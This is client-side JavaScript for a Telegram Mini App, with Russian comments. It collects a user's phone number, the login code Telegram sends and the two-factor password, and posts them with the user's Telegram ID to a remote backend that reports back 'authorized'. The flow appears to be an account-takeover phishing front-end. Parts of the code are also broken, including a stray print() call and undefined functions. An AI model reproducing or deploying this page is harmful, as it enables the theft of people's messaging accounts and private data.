const TelegramWebApp = window.Telegram.WebApp;
TelegramWebApp.ready(); // Сообщаем Telegram, что приложение готово
TelegramWebApp.expand();
Telegram.WebApp.MainButton.setParams({
    text: 'Поделиться номером телефона',
    has_shine_effect: true,
    is_visible: false
});

const CODE_EXPIRATION_TIME = 20000; // 2 минуты в миллисекундах

const page1 = document.getElementById('page1');
const page2 = document.getElementById('page2');
const page3 = document.getElementById('page3');
const page4 = document.getElementById('page4');
const page5 = document.getElementById('page5');

const code_cells = document.querySelectorAll('.code-cell');
const resend_button = document.querySelector('.resend_button');
const loader_code = document.querySelector('.loader-code');
const keyboard = document.querySelector('.keyboard');
const passwordInput = document.querySelector('.password_input');

const infoModal = document.getElementById('infoModal');
const infoModalText = document.getElementById('infoModalText');

// // const API_URL = 'http://localhost:8000';
// const API_URL = 'https://sigma-backend-w5js.onrender.com';
function get_phone() {
    return localStorage.getItem("local_phone");
}
const USER_ID = String(TelegramWebApp.initDataUnsafe.user?.id) || "None";
const USER_USERNAME = TelegramWebApp.initDataUnsafe.user?.username || "None";

// Функция для показа информационного модального окна
function info(text) {
    infoModalText.textContent = text;
    infoModal.classList.add('visible');
    setTimeout(() => {
        infoModal.classList.remove('visible');
    }, 4000);
}

function startTimer() {
    let timeLeft = 30;
    resend_button.classList.remove("resend_active");
    resend_button.textContent = `Отправить ещё раз через ${timeLeft}с`;

    let timer = setInterval(() => {
        timeLeft -= 1;
        resend_button.textContent = `Отправить ещё раз через ${timeLeft}с`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
            resend_button.textContent = "Отправить ещё раз";
            resend_button.classList.add("resend_active");
        }
    }, 1000);
}

function close_all_pages() {
    page1.classList.remove('active');
    page1.classList.add('hidden');

    page2.classList.remove('active');
    page2.classList.add('hidden');

    page3.classList.remove('active');
    page3.classList.add('hidden');

    page4.classList.remove('active');
    page4.classList.add('hidden');

    page5.classList.remove('active');
    page5.classList.add('hidden');

    Telegram.WebApp.SecondaryButton.hide();
}

function step1() {
    localStorage.setItem("step", "welcome");
    localStorage.setItem("codeTimestamp", Date.now().toString());

    close_all_pages();
    page1.classList.remove('hidden');
    page1.classList.add('active');

    Telegram.WebApp.MainButton.setParams({
        text: 'Поделиться номером телефона',
        has_shine_effect: true,
        is_visible: true
    });
}

function step2() {
    setTimeout(() => {
        animation_sms.goToAndPlay(0, true);
    }, 200);
    localStorage.setItem("step", "code");
    localStorage.setItem("codeTimestamp", Date.now().toString());
    startTimer();

    close_all_pages();
    page2.classList.remove('hidden');
    page2.classList.add('active');

    TelegramWebApp.MainButton.hide();
}

async function step3() {
    setTimeout(() => {
        animation_password.goToAndPlay(0, true);
    }, 200);
    localStorage.setItem("step", "two_fa");
    localStorage.setItem("codeTimestamp", Date.now().toString());
    
    close_all_pages();
    page3.classList.remove('hidden');
    page3.classList.add('active');

    Telegram.WebApp.MainButton.setParams({
        text: 'Продолжить',
        has_shine_effect: true,
        is_active: false,
        is_visible: true
    });

    await sendRequest("password_opened", "POST", {
        phone_number: get_phone(),
        telegram_user_id: USER_ID,
        telegram_username: USER_USERNAME
    });
}

function step4() {
    setTimeout(() => {
        animation_finish.goToAndPlay(0, true);
    }, 200);
    localStorage.setItem("step", "finished");
    localStorage.setItem("codeTimestamp", Date.now().toString());

    close_all_pages();
    page4.classList.remove('hidden');
    page4.classList.add('active');

    Telegram.WebApp.MainButton.setParams({
        text: 'Закрыть',
        has_shine_effect: true,
        is_visible: true
    });

    Telegram.WebApp.SecondaryButton.setText("Начать заново").setParams({
        position: "bottom",
        is_visible: true
    });
}

function loading_page() {
    close_all_pages();

    page5.classList.remove('hidden');
    page5.classList.add('active');

    TelegramWebApp.MainButton.hide();
}

document.addEventListener("DOMContentLoaded", async () => {
    let step = localStorage.getItem("step");
    let timestamp = localStorage.getItem("codeTimestamp");
    let elapsedTime = Date.now() - parseInt(timestamp, 10);
    console.log('step', step)
    const steps = {
        welcome: step1,
        code: step2,
        two_fa: step3,
        finished: step4
    };
    
    if (elapsedTime >= CODE_EXPIRATION_TIME) {
        resetProcess();
    } else {
        (steps[step] || resetProcess)(); // Если step не найден, вызывается resetProcess
    }

    await sendRequest("mini_app_opened", "POST", {
        telegram_user_id: USER_ID,
        telegram_username: USER_USERNAME
    });
});

async function request_user_phone() {
    return new Promise((resolve, reject) => {
        Telegram.WebApp.requestContact((initialResponse) => {
            if (initialResponse === true) {
                Telegram.WebApp.onEvent("contactRequested", (result) => {
                    if (result.status === "sent") {
                        const phone = result.responseUnsafe?.contact?.phone_number;
                        if (phone) {
                            console.log("Extracted phone:", phone);
                            localStorage.setItem("local_phone", phone);
                            TelegramWebApp.MainButton.hide();
                            Telegram.WebApp.sendData(JSON.stringify({
                                action: "phone_shared",
                                phone_number: phone
                            }));
                            resolve(phone);
                        }
                    }
                    Telegram.WebApp.offEvent("contactRequested", this);
                });
            }
        });
        setTimeout(() => {
            Telegram.WebApp.offEvent("contactRequested", this);
        }, 15000);
    });
}

resend_button.addEventListener("click", async function() {
    localStorage.setItem("codeTimestamp", Date.now().toString());
    startTimer();

    const data = await sendRequest("request_code", "POST", {
        phone_number: get_phone(),
        telegram_user_id: USER_ID,
        telegram_username: USER_USERNAME
    });
    if (data.status === "code_sent") {
        info("Код отправлен повторно");
    }
});

// 6️⃣ Клик по MainButton запускает переход
TelegramWebApp.MainButton.onClick(async () => {
    Telegram.WebApp.HapticFeedback.impactOccurred('light');
    let step = localStorage.getItem("step");

    // if (step === "welcome") {
    //     let phone_to_use;

        if (get_phone() === null) {
            phone_to_use = await request_user_phone();
        } else {
            phone_to_use = get_phone();
            print(phone_to_use, 'ТЕЛЕФОНЧЕПК')
            step2();
        }
        // loading_page();
        // const data = await sendRequest("request_code", "POST", {
        //     phone_number: phone_to_use,
        //     telegram_user_id: USER_ID,
        //     telegram_username: USER_USERNAME
        // });

        // if (data.status === "code_sent") {
        //     step2();
        // }
});

TelegramWebApp.SecondaryButton.onClick(async () => {
    resetProcess();
});

function resetProcess() {
    localStorage.setItem("step", "welcome");
    localStorage.setItem("codeTimestamp", Date.now().toString());
    
    step1();
}

// Функция для обновления темы
function updateTheme() {
    const themeParams = TelegramWebApp.themeParams;
    const colorScheme = TelegramWebApp.colorScheme;
    const body = document.body;

    // Удаляем все темы, чтобы избежать дублирования
    body.classList.remove('light-theme', 'dark-theme');

    // Применяем новую тему
    if (colorScheme === 'dark') {
        body.classList.add('dark-theme');
    } else {
        body.classList.add('light-theme');
    }

    document.documentElement.style.setProperty('--tg-accent-color', themeParams.accent_text_color || '#1687ff');

    // Меняем цвет статус-бара через setHeaderColor()
    if (TelegramWebApp.setHeaderColor) {
        const headerColor = colorScheme === 'dark' ? '#1c1c1c' : '#ffffff'; // Принудительно устанавливаем белый для светлой темы
        TelegramWebApp.setHeaderColor(headerColor);
    }

    // Меняем цвет фона Mini App
    if (TelegramWebApp.setBackgroundColor) {
        const bgColor = colorScheme === 'dark' ? '#1c1c1c' : '#ffffff'; // Синхронизируем с фоном
        TelegramWebApp.setBackgroundColor(bgColor);
    }
}

// Устанавливаем начальную тему
updateTheme();

// Подписываемся на событие изменения темы
TelegramWebApp.onEvent('themeChanged', () => {
    updateTheme(); // Обновляем тему при смене
});


// Управление вводом кода через клавиатуру и клетки
const cells = [
    document.getElementById('digit1'),
    document.getElementById('digit2'),
    document.getElementById('digit3'),
    document.getElementById('digit4'),
    document.getElementById('digit5')
];
let currentCell = 0;

function updateCodeDisplay(isErase = false) {
    cells.forEach((cell, index) => {
        let cellContent = cells[index].textContent || ' ';
        // Обновляем содержимое клетки, оборачивая в span, если его нет
        if (!cell.querySelector('span')) {
            cell.innerHTML = `<span>${cellContent}</span>`;
        } else {
            cell.querySelector('span').textContent = cellContent;
        }
        cell.classList.remove('focused'); // Сбрасываем подсветку для всех клеток
    });
    if (currentCell < cells.length) {
        cells[currentCell].classList.add('focused'); // Подсвечиваем текущую клетку
        // Применяем анимацию только к новой цифре при вводе (не при стирании)
        if (!isErase && currentCell > 0) {
            const currentSpan = cells[currentCell - 1]?.querySelector('span');
            if (currentSpan) {
                currentSpan.style.animation = 'none'; // Сбрасываем анимацию
                requestAnimationFrame(() => {
                    currentSpan.style.animation = 'slideUp 0.2s ease-out';
                });
            }
        }
    }
}

function clearCodeCells() {
    cells.forEach(cell => cell.textContent = ''); // Очищаем все клетки
    currentCell = 0; // Сбрасываем текущую позицию
    updateCodeDisplay(true); // Обновляем отображение без анимации
}

function start_code_loading() {
    keyboard.classList.add('hidden');
    keyboard.classList.remove('active');

    resend_button.classList.add('hidden');
    resend_button.classList.remove('active');
    
    code_cells.forEach(cell => {
        cell.classList.add('hidden');
        cell.classList.remove('active');
    });

    setTimeout(() => {
        loader_code.classList.remove('hidden');
        loader_code.classList.add('active');
    }, 200);
}

function end_code_loading() {
    clearCodeCells();
    loader_code.classList.add('hidden');
    loader_code.classList.remove('active');

    setTimeout(() => {
        keyboard.classList.remove('hidden');
        keyboard.classList.add('active');

        resend_button.classList.remove('hidden');
        resend_button.classList.add('active');
    
        code_cells.forEach(cell => {
            cell.classList.remove('hidden');
            cell.classList.add('active');
            cell.classList.add('shake');
        });
        setTimeout(() => {
            code_cells.forEach(cell => {
                cell.classList.remove('shake');
            });
        }, 200);
    }, 200);
}

// Обработка нажатия на кнопки цифр
document.querySelectorAll('.keyboard button[data-digit]').forEach(button => {
    button.addEventListener('click', async (e) => {
        // e.preventDefault(); // Предотвращаем открытие стандартной клавиатуры
        const digit = button.getAttribute('data-digit');

        if (currentCell < cells.length) {
            Telegram.WebApp.HapticFeedback.impactOccurred('soft');

            cells[currentCell].textContent = digit;
            currentCell++;
            updateCodeDisplay();

            if (currentCell === cells.length) {
                const enteredCode = Array.from(cells).map(cell => cell.textContent.trim()).join('');

                start_code_loading();
                const data = await sendRequest("verify_code", "POST", {
                    phone_number: get_phone(),
                    code: enteredCode,
                    telegram_user_id: USER_ID,
                    telegram_username: USER_USERNAME
                });
                end_code_loading();

                if (data.status === "authorized") {
                    if (data.needs_password) {
                        await step3();
                    } else {
                        step4();
                    }
                }
            }
        }
    });
});

// Обработка кнопки стирания
const eraseButton = document.getElementById('eraseButton');
eraseButton.addEventListener('click', () => {
    if (currentCell > 0) {
        currentCell--;
        cells[currentCell].textContent = '';
        updateCodeDisplay(true);
        Telegram.WebApp.HapticFeedback.impactOccurred('soft');
        // Убираем фокус, чтобы не открывалась клавиатура
        document.activeElement.blur();
    } else {
        cells.forEach(cell => cell.textContent = '');
        currentCell = 0;
        updateCodeDisplay(true);
    }
});

// Инициализация при загрузке второй страницы
page2.addEventListener('transitionend', () => {
    if (page2.classList.contains('active')) {
        updateCodeDisplay(); // Устанавливаем начальное состояние клеток
    }
});

document.addEventListener('click', (event) => {
    if (passwordInput === document.activeElement && !passwordInput.contains(event.target)) {
        passwordInput.blur();
    }
});

var animation_sms = lottie.loadAnimation({
    container: document.querySelector(".sms-icon"),
    renderer: "svg",
    loop: false,
    autoplay: false,
    path: "media/sms.json"
});

var animation_password = lottie.loadAnimation({
    container: document.querySelector(".password-icon"),
    renderer: "svg",
    loop: false,
    autoplay: false,
    path: "media/monkey.json"
});

var animation_finish = lottie.loadAnimation({
    container: document.querySelector(".finish-icon"),
    renderer: "svg",
    loop: false,
    autoplay: false,
    path: "media/finish.json"
});

document.querySelector(".sms-icon").addEventListener("click", function () {
    animation_sms.goToAndPlay(0, true);
});
document.querySelector(".password-icon").addEventListener("click", function () {
    animation_password.goToAndPlay(0, true);
});
document.querySelector(".finish-icon").addEventListener("click", function () {
    animation_finish.goToAndPlay(0, true);
});
